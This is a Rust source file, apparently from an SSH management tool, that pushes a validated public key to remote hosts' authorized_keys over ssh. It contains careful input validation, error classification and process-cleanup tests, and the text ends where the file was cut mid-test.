//! Push a public key onto a remote host's `~/.ssh/authorized_keys`.
//!
//! Equivalent of `ssh-copy-id` without the dependency: spawns a single
//! ssh invocation per host, pipes the public key over stdin, and runs an
//! idempotent shell snippet on the remote that creates `~/.ssh` if
//! missing and appends the key only when it is not already present.
//!
//! The remote snippet never sees the pubkey via the shell command line
//! (which would require fragile escaping). Stdin is the canonical channel
//! for binary-ish content over SSH.

use std::io::{Read, Write};
use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, Mutex};

use log::debug;

use crate::snippet::ChildGuard;

/// Outcome for one host in a push run. The renderer summarises these
/// into a toast (when every entry is `Appended` / `AlreadyPresent`) or a
/// sticky error block (when at least one is `Failed`). The two prompt
/// variants leave the summary and open a dialog instead.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum KeyPushOutcome {
    /// Pubkey was newly appended to the remote `authorized_keys`.
    Appended,
    /// Pubkey was already present in `authorized_keys`; nothing changed.
    AlreadyPresent,
    /// Push failed. Carries a scrubbed stderr excerpt (control chars
    /// stripped, length-capped) so the user sees what went wrong without
    /// leaking the full ssh-vvv firehose into the UI.
    Failed(String),
    /// ssh ended with `Permission denied` and the server takes no password.
    /// Reported like `Failed`; kept apart so a missing security key PIN can
    /// be told from a remote command that failed.
    AuthRefused(String),
    /// ssh ended with `Permission denied` and the server still takes a
    /// password. The TUI asks for one and pushes again. `host` is the hop
    /// ssh named as refusing, which on a ProxyJump chain may be a bastion
    /// rather than the target.
    NeedsPassword {
        detail: String,
        host: Option<String>,
    },
    /// Strict host key checking refused a host that is not in
    /// `known_hosts` yet. The TUI asks whether to trust it and pushes again.
    /// `host` is the one ssh named, a bastion included.
    UnknownHostKey {
        detail: String,
        host: Option<String>,
    },
}

/// Authentication inputs for one host, resolved on the main thread before
/// the worker spawns. `trust_new_host_key` is set only by the retry that
/// follows the trust dialog.
#[derive(Clone, Default, PartialEq, Eq)]
pub struct PushAuth {
    pub askpass: Option<String>,
    pub session_password: Option<String>,
    pub bw_session: Option<String>,
    pub trust_new_host_key: bool,
    pub security_key: crate::security_key::SecurityKeyRun,
    /// Where a security key refusal is recorded.
    pub paths: Option<crate::runtime::env::Paths>,
}

// Hand-written so a stray `{:?}` can never print the password or the
// Bitwarden token. Shows whether each is present, never its value.
impl std::fmt::Debug for PushAuth {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("PushAuth")
            .field("askpass", &self.askpass)
            .field("session_password", &self.session_password.is_some())
            .field("bw_session", &self.bw_session.is_some())
            .field("trust_new_host_key", &self.trust_new_host_key)
            .field("security_key", &self.security_key)
            .finish_non_exhaustive()
    }
}

/// The ssh child currently running, shared between the push worker and the
/// UI thread. Esc and q terminate it through here, so a cancel acts within
/// the SIGTERM grace window instead of waiting for ssh to give up.
#[derive(Clone, Default)]
pub struct InflightChild(Arc<Mutex<Option<Arc<ChildGuard>>>>);

impl InflightChild {
    fn set(&self, guard: Arc<ChildGuard>) {
        *self.0.lock().unwrap_or_else(|e| e.into_inner()) = Some(guard);
    }

    fn clear(&self) {
        self.0.lock().unwrap_or_else(|e| e.into_inner()).take();
    }

    /// Kill the running child, if any. A no-op between hosts.
    pub fn terminate(&self) {
        let guard = self.0.lock().unwrap_or_else(|e| e.into_inner()).take();
        if let Some(g) = guard {
            g.terminate();
        }
    }

    #[cfg(test)]
    pub(crate) fn is_set(&self) -> bool {
        self.0.lock().unwrap_or_else(|e| e.into_inner()).is_some()
    }
}

/// One row in the in-flight push result list. Populated as worker
/// threads complete and surfaced to the UI via `AppEvent::KeyPushResult`.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct KeyPushResult {
    pub alias: String,
    pub outcome: KeyPushOutcome,
}

/// Reason recorded for a host the user aborted. Spelled once so the
/// worker and the test that reads it cannot drift apart.
const ABORTED: &str = "canceled";

/// Maximum stderr length retained in `KeyPushOutcome::Failed`. Longer
/// `ssh -v` output is truncated with an ellipsis so a single failure
/// cannot blow out the sticky error overlay.
const STDERR_BUDGET: usize = 200;

/// Marker prefix written by the remote snippet on the final line of
/// stdout. The prefix is unique enough that no realistic `.profile` or
/// motd will collide. `classify_stdout` matches against this prefix so a
/// shared-account host whose login banner echoes the word "APPENDED"
/// cannot trick us into reporting success.
const MARKER_APPENDED: &str = "__PURPLE_KEY_PUSH:APPENDED__";
const MARKER_ALREADY_PRESENT: &str = "__PURPLE_KEY_PUSH:ALREADY_PRESENT__";
const MARKER_APPEND_FAILED: &str = "__PURPLE_KEY_PUSH:APPEND_FAILED__";

/// Remote shell snippet that idempotently appends the pubkey to
/// `~/.ssh/authorized_keys`. The pubkey arrives on stdin via `$(cat)` so
/// no shell quoting of the key content is needed locally.
///
/// Permission policy: `~/.ssh` is chmod 700 only when we just created
/// it (so a deliberately group-readable directory managed by Ansible or
/// similar is left alone), and `authorized_keys` is chmod 600 only when
/// the file is fresh. Both invariants are enforced via short-circuit:
/// the absence test runs before the create, and the chmod runs only on
/// the create branch. sshd's StrictModes requires the dir to be 700, so
/// a wide-open dir we created is tightened immediately.
///
/// CRLF defence: $PUBKEY is normalised with `tr -d '\r'` before both the
/// dedup match and the append, so a CRLF-terminated source file cannot
/// produce a fresh duplicate per push. The file side already strips CR
/// before matching so authorized_keys files edited with Windows tooling
/// dedup correctly too.
///
/// The append uses `|| { ... exit 1; }` so a failed write (ENOSPC,
/// read-only mount) emits APPEND_FAILED instead of silently claiming
/// success on the redirect's exit code.
///
/// Output contract (always the last non-empty line of stdout):
/// - `__PURPLE_KEY_PUSH:APPENDED__`        - key was newly written
/// - `__PURPLE_KEY_PUSH:ALREADY_PRESENT__` - key was already in file
/// - `__PURPLE_KEY_PUSH:APPEND_FAILED__`   - append redirect failed
/// - anything else                          - classified as Failed
const REMOTE_SNIPPET: &str = r#"umask 077
if [ ! -d ~/.ssh ]; then
  mkdir -p ~/.ssh
  chmod 700 ~/.ssh
fi
if [ ! -f ~/.ssh/authorized_keys ]; then
  touch ~/.ssh/authorized_keys
  chmod 600 ~/.ssh/authorized_keys
fi
PUBKEY=$(cat | tr -d '\r')
if tr -d '\r' < ~/.ssh/authorized_keys 2>/dev/null | grep -qxF -- "$PUBKEY"; then
  echo __PURPLE_KEY_PUSH:ALREADY_PRESENT__
  exit 0
fi
printf '%s\n' "$PUBKEY" >> ~/.ssh/authorized_keys || { echo __PURPLE_KEY_PUSH:APPEND_FAILED__; exit 1; }
echo __PURPLE_KEY_PUSH:APPENDED__
"#;

/// Parse the remote snippet's stdout into an outcome. Pure helper so the
/// worker and tests share the same classification. Match is against the
/// last non-empty line (stripped of trailing CR) so motd or login-banner
/// output before the marker is tolerated.
pub fn classify_stdout(stdout: &str) -> Option<KeyPushOutcome> {
    let trimmed = stdout.trim();
    let last = trimmed
        .lines()
        .map(|l| l.trim_end_matches('\r').trim())
        .rfind(|l| !l.is_empty())?;
    match last {
        MARKER_APPENDED => Some(KeyPushOutcome::Appended),
        MARKER_ALREADY_PRESENT => Some(KeyPushOutcome::AlreadyPresent),
        MARKER_APPEND_FAILED => Some(KeyPushOutcome::Failed(
            "remote append failed (disk full, read-only mount?)".to_string(),
        )),
        _ => None,
    }
}

/// Scrub stderr for display in the UI. Drops ANSI escapes, control bytes,
/// then caps at `STDERR_BUDGET` chars with an ellipsis. Joins multiple
/// lines with a single space so the error sticky overlay can render the
/// scrubbed text on one row.
fn scrub_stderr(raw: &str) -> String {
    let cleaned: String = raw
        .chars()
        .filter(|c| !c.is_control() || *c == '\n')
        .collect();
    let joined = cleaned
        .lines()
        .map(str::trim)
        .filter(|l| !l.is_empty())
        .collect::<Vec<_>>()
        .join(" ");
    if joined.chars().count() > STDERR_BUDGET {
        joined.chars().take(STDERR_BUDGET).collect::<String>() + "..."
    } else {
        joined
    }
}

/// Build the ssh command for one push. Pure, so tests can inspect argv and
/// env without spawning anything.
///
/// The child never reaches the tty: strict host key checking turns an
/// unknown host into an error (`accept-new` on the retry after the trust
/// dialog) and `BatchMode=yes` turns a password prompt into `Permission
/// denied` when neither a source nor a session password can answer it.
pub(crate) fn build_push_command(alias: &str, config_path: &Path, auth: &PushAuth) -> Command {
    let mut cmd = Command::new("ssh");
    cmd.arg("-F")
        .arg(config_path)
        .arg("-T")
        .arg("-o")
        .arg("ConnectTimeout=10")
        // ServerAliveInterval/CountMax bound the post-auth phase:
        // ConnectTimeout only covers the TCP/handshake. Without these,
        // a remote NFS-stalled `~/.ssh/authorized_keys` or a hung shell
        // could block the wait indefinitely. 10s × 3 = 30s worst case
        // after auth before SSH tears down the session.
        .arg("-o")
        .arg("ServerAliveInterval=10")
        .arg("-o")
        .arg("ServerAliveCountMax=3")
        .arg("-o")
        .arg("ControlMaster=no")
        .arg("-o")
        .arg("ControlPath=none");
    let strict = if auth.trust_new_host_key {
        "StrictHostKeyChecking=accept-new"
    } else {
        "StrictHostKeyChecking=yes"
    };
    cmd.arg("-o")
        .arg(strict)
        .arg("-o")
        .arg(crate::askpass_env::SINGLE_PASSWORD_PROMPT_OPT);
    if crate::askpass_env::needs_batch_mode(
        auth.askpass.as_deref(),
        auth.session_password.as_deref(),
    ) {
        cmd.arg("-o").arg(crate::askpass_env::BATCH_MODE_OPT);
    }
    cmd.arg("--")
        .arg(alias)
        .arg(REMOTE_SNIPPET)
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped());

    crate::askpass_env::configure_auth(
        &mut cmd,
        alias,
        config_path,
        auth.askpass.as_deref(),
        auth.session_password.as_deref(),
        auth.bw_session.as_deref(),
        true,
    );
    crate::security_key::configure(&mut cmd, &auth.security_key);

    // Own process group: cancel and shutdown signal ssh together with any
    // ProxyCommand it spawned. A Ctrl+C aimed at purple never reaches them.
    #[cfg(unix)]
    // SAFETY: pre_exec runs after fork, before exec in the child. setpgid(0, 0)
    // is async-signal-safe (POSIX) and touches no Rust runtime state. The
    // return value is ignored: a failed setpgid leaves ssh in purple's group,
    // which still pushes.
    unsafe {
        use std::os::unix::process::CommandExt;
        cmd.pre_exec(|| {
            libc::setpgid(0, 0);
            Ok(())
        });
    }
    cmd
}

/// Push `pubkey` to the remote `alias` over SSH. Synchronous: spawns the
/// command from `build_push_command`, pipes `pubkey` to stdin, waits for the
/// child to finish and returns the parsed outcome. The cancel flag is
/// observed before the spawn so a rapid Esc after launching the batch can
/// short-circuit pending hosts. The running child is registered in
/// `inflight` so the same Esc can kill it mid-connection.
pub fn push_to_host(
    pubkey: &str,
    alias: &str,
    config_path: &Path,
    auth: &PushAuth,
    cancel: &Arc<AtomicBool>,
    inflight: &InflightChild,
) -> KeyPushOutcome {
    if cancel.load(Ordering::Relaxed) {
        return KeyPushOutcome::Failed(ABORTED.to_string());
    }

    let mut cmd = build_push_command(alias, config_path, auth);

    let mut child = match cmd.spawn() {
        Ok(c) => c,
        Err(e) => {
            debug!("[purple] key_push: spawn failed alias={} err={}", alias, e);
            return KeyPushOutcome::Failed(format!("spawn ssh: {}", e));
        }
    };

    let stdin = child.stdin.take();
    let stdout_pipe = child.stdout.take();
    let stderr_pipe = child.stderr.take().map(|pipe| {
        crate::security_key::RefusalScan::new(pipe, auth.paths.as_ref(), &auth.security_key)
    });
    let guard = Arc::new(ChildGuard::new(child));
    inflight.set(Arc::clone(&guard));

    // Pipe the pubkey with a trailing newline so `printf '%s\n' "$PUBKEY"`
    // on the remote produces an exact `authorized_keys` line.
    if let Some(mut stdin) = stdin {
        let payload = if pubkey.ends_with('\n') {
            pubkey.to_string()
        } else {
            format!("{}\n", pubkey)
        };
        if let Err(e) = stdin.write_all(payload.as_bytes()) {
            debug!(
                "[purple] key_push: stdin write failed alias={} err={}",
                alias, e
            );
            guard.terminate();
            inflight.clear();
            return KeyPushOutcome::Failed(format!("write pubkey: {}", e));
        }
        // Drop stdin so the remote `cat` receives EOF.
        drop(stdin);
    }

    // Drain both pipes on their own threads so a chatty remote cannot block
    // on a full pipe. The wait stays on this thread because it is what
    // escalates a cancel to SIGKILL and sweeps the process group. Reading
    // here instead would park this thread on a pipe that a `ProxyCommand`
    // outliving ssh still holds open, and the escalation would never run.
    let stdout_reader = std::thread::spawn(move || {
        let mut buf = Vec::new();
        if let Some(mut pipe) = stdout_pipe {
            let _ = pipe.read_to_end(&mut buf);
        }
        buf
    });
    let stderr_reader = std::thread::spawn(move || {
        let mut buf = Vec::new();
        if let Some(mut pipe) = stderr_pipe {
            let _ = pipe.read_to_end(&mut buf);
        }
        buf
    });

    let status = guard.wait();
    inflight.clear();
    let stdout_buf = stdout_reader.join().unwrap_or_default();
    let stderr_buf = stderr_reader.join().unwrap_or_default();

    let Some(status) = status else {
        debug!("[purple] key_push: wait failed alias={}", alias);
        return KeyPushOutcome::Failed("wait ssh: child already reaped".to_string());
    };

    if cancel.load(Ordering::Relaxed) {
        debug!(
            "[purple] key_push: cancel hit mid-connection alias={}",
            alias
        );
        return KeyPushOutcome::Failed(ABORTED.to_string());
    }

    let stdout = String::from_utf8_lossy(&stdout_buf);
    let stderr = String::from_utf8_lossy(&stderr_buf);

    if !status.success() {
        // Classify on the raw stderr: the scrubbed excerpt is capped and a
        // long warning prefix could push the decisive line past the cap.
        let filtered = crate::file_browser::filter_ssh_warnings(&stderr);
        let scrubbed = scrub_stderr(&filtered);
        let msg = if scrubbed.is_empty() {
            format!("ssh exited {}", status)
        } else {
            scrubbed
        };
        if crate::connection::is_unknown_host_key(&stderr) {
            let host = crate::connection::unknown_host_key_host(&stderr).map(str::to_string);
            debug!(
                "[purple] key_push: unknown host key alias={} host={:?} status={}",
                alias, host, status
            );
            return KeyPushOutcome::UnknownHostKey { detail: msg, host };
        }
        if crate::connection::needs_password(&stderr) {
            let host = crate::connection::denied_host(&stderr).map(str::to_string);
            debug!(
                "[purple] key_push: needs password alias={} refused_by={:?} status={}",
                alias, host, status
            );
            return KeyPushOutcome::NeedsPassword { detail: msg, host };
        }
        if crate::connection::auth_refused(&stderr) {
            debug!(
                "[purple] key_push: authentication refused alias={} status={}",
                alias, status
            );
            return KeyPushOutcome::AuthRefused(msg);
        }
        debug!(
            "[purple] key_push: failed alias={} status={} stderr={}",
            alias, status, msg
        );
        return KeyPushOutcome::Failed(msg);
    }

    match classify_stdout(&stdout) {
        Some(outcome) => {
            debug!("[purple] key_push: alias={} outcome={:?}", alias, outcome);
            outcome
        }
        None => {
            let preview = scrub_stderr(&stdout);
            KeyPushOutcome::Failed(format!(
                "unexpected snippet output: {}",
                if preview.is_empty() {
                    "(empty)"
                } else {
                    &preview
                }
            ))
        }
    }
}

/// Maximum size of a `.pub` file we will accept. OpenSSH's RSA-8192 keys
/// serialise to ~3 KiB; we cap at 16 KiB to leave headroom for comments
/// and reject pathological inputs (symlinks to logs, /dev/urandom).
pub const PUBKEY_MAX_BYTES: u64 = 16 * 1024;

/// Public-key type tokens we will push. Limited to the OpenSSH algorithms
/// that produce valid `authorized_keys` entries. Cert tokens (e.g.
/// `ssh-ed25519-cert-v01@openssh.com`) are intentionally excluded: pushing
/// a certificate as a static key bypasses its TTL.
const ALLOWED_KEY_TYPES: &[&str] = &[
    "ssh-rsa",
    "ssh-ed25519",
    "ssh-dss",
    "ecdsa-sha2-nistp256",
    "ecdsa-sha2-nistp384",
    "ecdsa-sha2-nistp521",
    "sk-ssh-ed25519@openssh.com",
    "sk-ecdsa-sha2-nistp256@openssh.com",
];

/// Validation outcome for a public-key file's contents.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum PubkeyValidationError {
    Empty,
    MultiLine,
    UnsupportedType(String),
    MalformedBase64,
    TooLarge(u64),
    NotARegularFile,
}

/// Parse and validate a `.pub` file's contents into a single canonical
/// `authorized_keys` line. Rejects multi-line input (which would silently
/// install several keys, including embedded `command=` clauses), unknown
/// algorithms, and unparseable base64 bodies. The returned string is
/// trimmed of trailing whitespace / CR so the remote `grep -qxF` dedup
/// step matches byte-for-byte across pushes.
pub fn validate_pubkey(raw: &str) -> Result<String, PubkeyValidationError> {
    let trimmed = raw.trim_end_matches(['\n', '\r', ' ', '\t']);
    if trimmed.is_empty() {
        return Err(PubkeyValidationError::Empty);
    }
    if trimmed.lines().count() != 1 {
        return Err(PubkeyValidationError::MultiLine);
    }
    let mut parts = trimmed.splitn(3, ' ');
    let typ = parts.next().unwrap_or("");
    let blob = parts.next().unwrap_or("");
    if !ALLOWED_KEY_TYPES.contains(&typ) {
        return Err(PubkeyValidationError::UnsupportedType(typ.to_string()));
    }
    if blob.is_empty() {
        return Err(PubkeyValidationError::MalformedBase64);
    }
    use base64::Engine;
    if base64::engine::general_purpose::STANDARD
        .decode(blob.as_bytes())
        .is_err()
    {
        return Err(PubkeyValidationError::MalformedBase64);
    }
    Ok(trimmed.to_string())
}

/// Read a `.pub` file with a hard byte cap and reject anything that is
/// not a regular file. On Unix the open uses `O_NOFOLLOW` so a symlink at
/// the .pub path errors out instead of silently dereferencing into a log
/// file or `/dev/urandom`.
pub fn read_pubkey_file(path: &Path) -> Result<String, PubkeyValidationError> {
    use std::io::Read;
    let mut opts = std::fs::OpenOptions::new();
    opts.read(true);
    #[cfg(unix)]
    {
        use std::os::unix::fs::OpenOptionsExt;
        opts.custom_flags(libc::O_NOFOLLOW);
    }
    let f = opts
        .open(path)
        .map_err(|_| PubkeyValidationError::NotARegularFile)?;
    let meta = f
        .metadata()
        .map_err(|_| PubkeyValidationError::NotARegularFile)?;
    if !meta.file_type().is_file() {
        return Err(PubkeyValidationError::NotARegularFile);
    }
    if meta.len() > PUBKEY_MAX_BYTES {
        return Err(PubkeyValidationError::TooLarge(meta.len()));
    }
    let mut buf = String::new();
    f.take(PUBKEY_MAX_BYTES)
        .read_to_string(&mut buf)
        .map_err(|_| PubkeyValidationError::NotARegularFile)?;
    Ok(buf)
}

/// Resolve the local public-key path for a key whose `display_path` is
/// `~/.ssh/id_ed25519`. Expands the tilde and appends `.pub`. The caller
/// is expected to validate the file exists before reading.
pub fn pubkey_path_for(paths: Option<&crate::runtime::env::Paths>, display_path: &str) -> PathBuf {
    let with_pub = format!("{}.pub", display_path);
    if let Some(rest) = with_pub.strip_prefix("~/")
        && let Some(p) = paths
    {
        return p.home().join(rest);
    }
    PathBuf::from(with_pub)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn classify_stdout_appended() {
        assert_eq!(
            classify_stdout("__PURPLE_KEY_PUSH:APPENDED__\n"),
            Some(KeyPushOutcome::Appended)
        );
    }

    #[test]
    fn classify_stdout_already_present() {
        assert_eq!(
            classify_stdout("__PURPLE_KEY_PUSH:ALREADY_PRESENT__\n"),
            Some(KeyPushOutcome::AlreadyPresent)
        );
    }

    #[test]
    fn classify_stdout_append_failed() {
        match classify_stdout("__PURPLE_KEY_PUSH:APPEND_FAILED__\n") {
            Some(KeyPushOutcome::Failed(_)) => {}
            other => panic!("expected Failed, got {:?}", other),
        }
    }

    #[test]
    fn classify_stdout_motd_then_marker() {
        // SSH-of-the-day banners or `.profile` output may print before
        // our marker. Last non-empty line still wins.
        let stdout = "Welcome to Ubuntu 22.04\nLast login: ...\n__PURPLE_KEY_PUSH:APPENDED__\n";
        assert_eq!(classify_stdout(stdout), Some(KeyPushOutcome::Appended));
    }

    #[test]
    fn classify_stdout_motd_word_collision_does_not_match() {
        // Adversarial: a banner that contains the bare word "APPENDED"
        // must NOT be classified as success. The namespaced marker
        // prevents collision.
        let stdout = "Welcome. APPENDED was a great patch.\nhave a good day\n";
        assert_eq!(classify_stdout(stdout), None);
    }

    #[test]
    fn classify_stdout_crlf_line_endings() {
        // Some shells emit CRLF over SSH ptys. The classifier strips the
        // trailing CR so the marker still matches.
        let stdout = "Welcome\r\n__PURPLE_KEY_PUSH:APPENDED__\r\n";
        assert_eq!(classify_stdout(stdout), Some(KeyPushOutcome::Appended));
    }

    #[test]
    fn classify_stdout_unknown_returns_none() {
        assert_eq!(classify_stdout("hello\nworld\n"), None);
    }

    #[test]
    fn classify_stdout_empty_returns_none() {
        assert_eq!(classify_stdout(""), None);
        assert_eq!(classify_stdout("\n\n"), None);
    }

    #[test]
    fn scrub_stderr_drops_control_bytes() {
        // ANSI-stripped: ESC[31mError\x1b[0m
        let raw = "\x1b[31mError: connection refused\x1b[0m\n";
        let scrubbed = scrub_stderr(raw);
        assert!(!scrubbed.contains('\x1b'));
        assert!(scrubbed.contains("Error"));
    }

    #[test]
    fn scrub_stderr_joins_lines() {
        let raw = "line1\nline2\nline3\n";
        assert_eq!(scrub_stderr(raw), "line1 line2 line3");
    }

    #[test]
    fn scrub_stderr_truncates_long_input() {
        let raw = "x".repeat(STDERR_BUDGET * 2);
        let scrubbed = scrub_stderr(&raw);
        assert!(scrubbed.ends_with("..."));
        assert!(scrubbed.chars().count() <= STDERR_BUDGET + 3);
    }

    #[test]
    fn scrub_stderr_empty_input() {
        assert_eq!(scrub_stderr(""), "");
        assert_eq!(scrub_stderr("   \n\n  \n"), "");
    }

    #[test]
    fn pubkey_path_appends_pub_suffix() {
        let p = pubkey_path_for(None, "/tmp/id_ed25519");
        assert_eq!(p.to_string_lossy(), "/tmp/id_ed25519.pub");
    }

    #[test]
    fn pubkey_path_expands_tilde() {
        let paths = crate::runtime::env::Paths::new("/home/u");
        let p = pubkey_path_for(Some(&paths), "~/.ssh/id_ed25519");
        assert!(!p.to_string_lossy().starts_with('~'));
        assert!(p.to_string_lossy().ends_with(".ssh/id_ed25519.pub"));
    }

    #[test]
    fn push_to_host_short_circuits_when_cancel_is_set() {
        // Cancel before spawn must return the abort reason without
        // touching ssh. We point at a path that does not exist on disk
        // so a buggy implementation that DID try to spawn would fail
        // loudly instead of silently succeeding.
        let cancel = Arc::new(AtomicBool::new(true));
        let inflight = InflightChild::default();
        let outcome = push_to_host(
            "ssh-ed25519 AAAA test@host",
            "this-alias-does-not-exist",
            std::path::Path::new("/tmp/purple-nonexistent-config"),
            &PushAuth::default(),
            &cancel,
            &inflight,
        );
        match outcome {
            KeyPushOutcome::Failed(msg) => {
                assert!(
                    msg.contains("cancel"),
                    "expected cancel message, got: {}",
                    msg
                );
            }
            other => panic!("expected Failed(cancelled), got {:?}", other),
        }
        assert!(!inflight.is_set(), "no child was spawned");
    }

    #[test]
    fn push_to_host_against_missing_config_fails_and_clears_inflight() {
        // A real spawn against a config path that does not exist: ssh
        // exits at once with a non-zero status. The inflight slot must be
        // empty afterwards so a later cancel never signals a reaped PID.
        let cancel = Arc::new(AtomicBool::new(false));
        let inflight = InflightChild::default();
        let outcome = push_to_host(
            "ssh-ed25519 AAAA test@host",
            "this-alias-does-not-exist",
            std::path::Path::new("/tmp/purple-nonexistent-config"),
            &PushAuth::default(),
            &cancel,
            &inflight,
        );
        assert!(
            matches!(outcome, KeyPushOutcome::Failed(_)),
            "got {outcome:?}"
        );
        assert!(!inflight.is_set());
    }

    #[test]
    fn inflight_terminate_kills_a_running_child() {
        // A `sleep` in its own process group stands in for a stuck ssh.
        let mut cmd = Command::new("sleep");
        cmd.arg("30");
        #[cfg(unix)]
        // SAFETY: setpgid(0, 0) is async-signal-safe and the closure touches
        // no Rust runtime state.
        unsafe {
            use std::os::unix::process::CommandExt;
            cmd.pre_exec(|| {
                libc::setpgid(0, 0);
                Ok(())
            });
        }
        let child = cmd.spawn().expect("spawn sleep");
        let guard = Arc::new(ChildGuard::new(child));
        let inflight = InflightChild::default();
        inflight.set(Arc::clone(&guard));
        assert!(inflight.is_set());
        let started = std::time::Instant::now();
        inflight.terminate();
        // Esc and quit both call this from the UI thread, so it signals and
        // returns rather than standing through the grace window.
        assert!(
            started.elapsed() < std::time::Duration::from_millis(100),
            "terminate held the caller for {:?}",
            started.elapsed()
        );
        assert!(!inflight.is_set());
        // The owner's wait returns promptly with the signal status.
        let status = guard.wait();
        assert!(started.elapsed() < std::time::Duration::from_secs(5));
        assert!(status.is_some_and(|s| !s.success()));
    }

    #[cfg(unix)]
    #[test]
    fn a_child_that_ignores_sigterm_is_killed_by_the_waiting_thread() {
        // terminate only signals now, so the escalation has to come from
        // whichever thread is in wait. A shell that traps SIGTERM proves it.
        // The shell ignores SIGTERM and outlives the `sleep` children that
        // do take it, so only SIGKILL ends this process group.
        let mut cmd = Command::new("sh");
        cmd.arg("-c")
            .arg("trap '' TERM; while :; do sleep 0.05; done");
        // SAFETY: setpgid(0, 0) is async-signal-safe and the closure touches
        // no Rust runtime state.
        unsafe {
            use std::os::unix::process::CommandExt;
            cmd.pre_exec(|| {
                libc::setpgid(0, 0);
                Ok(())
            });
        }
        let child = cmd.spawn().expect("spawn sh");
        let guard = Arc::new(ChildGuard::new(child));
        // Let the shell reach its `trap` first. Signaled before that, it
        // dies on SIGTERM like any other process and proves nothing.
        std::thread::sleep(std::time::Duration::from_millis(300));
        // The waiter reports through a channel rather than a join, so a
        // broken escalation fails this test instead of hanging the suite.
        let (tx, rx) = std::sync::mpsc::channel();
        {
            let guard = Arc::clone(&guard);
            std::thread::spawn(move || {
                let _ = tx.send(guard.wait());
            });
        }
        let started = std::time::Instant::now();
        guard.terminate();
        assert!(
            started.elapsed() < std::time::Duration::from_millis(100),
            "terminate held the caller for {:?}",
            started.elapsed()
        );
        let status = rx
            .recv_timeout(std::time::Duration::from_secs(5))
            .expect("the waiting thread must escalate to SIGKILL");
        use std::os::unix::process::ExitStatusExt;
        assert_eq!(
            status.and_then(|s| s.signal()),
            Some(libc::SIGKILL),
            "SIGTERM was ignored, so only SIGKILL can have ended it"
        );
    }

    #[test]
    #[cfg(unix)]
    fn a_stopped_run_sweeps_a_process_left_holding_the_pipe() {
        // ssh dies on SIGTERM long before a ProxyCommand it spawned has to,
        // and that command inherits ssh's stderr. Here the outer shell is
        // the one that dies and the inner one holds the pipe, so the reader
        // reaches EOF only once the group itself is swept. The inner shell
        // gives up on its own after ten seconds, so a regression leaves no
        // process behind.
        let mut cmd = Command::new("sh");
        cmd.arg("-c")
            .arg(
                "sh -c \"trap '' TERM; i=0; while [ \\$i -lt 200 ]; do sleep 0.05; i=\\$((i+1)); done\" & exec sleep 30",
            )
            .stdout(Stdio::piped())
            .stderr(Stdio::piped());
        // SAFETY: setpgid(0, 0) is async-signal-safe and the closure touches
        // no Rust runtime state.
        unsafe {
            use std::os::unix::process::CommandExt;
            cmd.pre_exec(|| {
                libc::setpgid(0, 0);
                Ok(())
            });
        }
        let mut child = cmd.spawn().expect("spawn sh");
        let stderr_pipe = child.stderr.take();
        let guard = Arc::new(ChildGuard::new(child));
        // Let the inner shell reach its trap before anything is signaled.
        std::thread::sleep(std::time::Duration::from_millis(300));

        // The reader reports through a channel so a regression fails this
        // test instead of hanging the suite.
        let (tx, rx) = std::sync::mpsc::channel();
        std::thread::spawn(move || {
            let mut buf = Vec::new();
            if let Some(mut pipe) = stderr_pipe {
                let _ = pipe.read_to_end(&mut buf);
            }
            let _ = tx.send(());
        });

        guard.terminate();
        assert!(guard.wait().is_some(), "the child itself is reaped");
        rx.recv_timeout(std::time::Duration::from_secs(5))
            .expect("the reader must reach EOF once the group is swept");
    }

    #[test]
    #[cfg(unix)]
    fn a_run_that_ends_on_its_own_sweeps_the_group_too() {
        // ssh can exit cleanly while something it spawned keeps the
        // inherited stderr open, and no cancel ever arrives. The reader
        // reaches EOF only because the sweep runs on every reap. The inner
        // shell gives up on its own after ten seconds, so a regression
        // leaves no process behind.
        let mut cmd = Command::new("sh");
        cmd.arg("-c")
            .arg("sh -c \"i=0; while [ \\$i -lt 200 ]; do sleep 0.05; i=\\$((i+1)); done\" & exec true")
            .stdout(Stdio::piped())
            .stderr(Stdio::piped());
        // SAFETY: setpgid(0, 0) is async-signal-safe and the closure touches
        // no Rust runtime state.
        unsafe {
            use std::os::unix::process::CommandExt;
            cmd.pre_exec(|| {
                libc::setpgid(0, 0);
                Ok(())
            });
        }
        let mut child = cmd.spawn().expect("spawn sh");
        let stderr_pipe = child.stderr.take();
        let guard = Arc::new(ChildGuard::new(child));

        let (tx, rx) = std::sync::mpsc::channel();
        std::thread::spawn(move || {
            let mut buf = Vec::new();
            if let Some(mut pipe) = stderr_pipe {
                let _ = pipe.read_to_end(&mut buf);
            }
            let _ = tx.send(());
        });

        // No terminate: this is the clean-exit path.
        assert!(guard.wait().is_some(), "the child itself is reaped");
        rx.recv_timeout(std::time::Duration::from_secs(5))
            .expect("the reader must reach EOF without a cancel");
    }

    fn push_args(auth: &PushAuth) -> Vec<String> {
        build_push_command("web1", std::path::Path::new("/tmp/cfg"), auth)
            .get_args()
            .map(|a| a.to_string_lossy().into_owned())
            .collect()
    }

    fn push_env_names(auth: &PushAuth) -> Vec<String> {
        build_push_command("web1", std::path::Path::new("/tmp/cfg"), auth)
            .get_envs()
            .filter_map(|(k, v)| v.map(|_| k.to_string_lossy().into_owned()))
            .collect()
    }

    fn has_opt(args: &[String], value: &str) -> bool {
        args.windows(2).any(|w| w[0] == "-o" && w[1] == value)
    }

    #[test]
    fn build_push_command_without_auth_sets_batch_mode_and_still_wires_askpass() {
        // BatchMode keeps the target from being asked at all. The askpass
        // program is wired anyway, because it is the only part of this that
        // a ProxyJump hop inherits: ssh builds that hop's command without
        // any `-o` option, so a bastion with nothing to answer would
        // otherwise prompt on the terminal.
        let auth = PushAuth::default();
        let args = push_args(&auth);
        assert!(has_opt(&args, "BatchMode=yes"), "got: {args:?}");
        assert!(has_opt(&args, "StrictHostKeyChecking=yes"), "got: {args:?}");
        let names = push_env_names(&auth);
        assert!(
            names.iter().any(|n| n == "SSH_ASKPASS_REQUIRE"),
            "got: {names:?}"
        );
        assert!(
            !names
                .iter()
                .any(|n| n == crate::askpass_env::ONESHOT_SECRET_VAR),
            "there is no secret to carry: {names:?}"
        );
    }

    #[test]
